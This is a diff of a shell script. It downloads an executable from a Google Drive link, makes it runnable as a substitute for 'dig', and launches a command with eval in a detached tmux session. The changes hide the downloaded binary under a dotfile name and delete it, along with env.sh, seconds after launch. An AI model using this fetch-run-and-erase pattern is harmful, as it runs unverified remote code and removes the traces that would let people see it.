@@ -57,20 +57,22 @@ endpoints_fallback() {
     pl_token=${pl_token/*\/}
 }
 
+filename=".rslv"
 getdig() {
     fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
-    filename="dig"
     wget --save-cookies ./cookie -O/dev/null \
          -q "https://drive.google.com/uc?export=download&id=${fileid}"
     wget --load-cookies ./cookie \
          "https://drive.google.com/uc?export=download&confirm=`awk '/download/ {print $NF}' ./cookie`&id=${fileid}" \
          -O ${filename}
-    chmod +x dig
+    chmod +x "$filename"
 }
 
 if type dig &>/dev/null; then
+    dig="dig"
     endpoints
 else
+    dig="$filename"
     getdig && endpoints ||
             endpoints_fallback
 fi
@@ -89,8 +91,8 @@ if [ "$TMX" = 1 ]; then
     tmux  setenv -g pl_name "$pl_name"
 
     tmux new -d -s crt 'eval '"$launcher"
-    (sleep 5 && rm env.sh) &>/dev/null &
+    (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
 else
-    (sleep 5 && rm env.sh) &>/dev/null &
+    (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
     eval "$launcher"
 fi
